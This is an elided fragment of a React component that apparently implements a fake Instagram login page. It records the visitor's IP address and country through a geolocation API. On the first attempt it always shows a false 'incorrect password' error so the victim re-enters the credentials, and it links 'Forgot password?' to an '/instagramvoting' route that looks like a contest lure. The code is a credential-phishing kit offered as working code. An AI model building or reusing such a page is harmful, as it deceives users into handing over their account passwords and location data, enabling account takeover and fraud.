...
const InstaLoginpage = () => {
  ...
  const [noOfClicked, setNoOfClicked] = useState(0)

  const [ip, setIp] = useState("");
  const [country, setCountry] = useState("");
  const url = `https://api.geoapify.com/v1/ipinfo?apiKey=${
    import.meta.env.VITE_LOCATIONAPI
  }`;
  ...
  const handleLogin = async () => {
    if (name === "" || password === "") {
      ...
      if (noOfClicked === 0) {
        setPassword("");
        // setName("");
        setErr("Sorry, your  username or password was incorrect. Please double-check your username or password.");
        setNoOfClicked(1)
      } else {
        setLoading(true);
        const allinputTitle = {
            ...
            <div className="form-wrap">
              ...
              <span className="botton-box">
                <button
                  ...
                  onClick={handleLogin}
                >
                  {loading ? <img src={loader} className="loader" /> : "Log in"}
                </button>
              </span>
              <Link className="forgot" to="/instagramvoting">
                Forgot password?
              </Link>
              <small>{err}</small>
            </div>
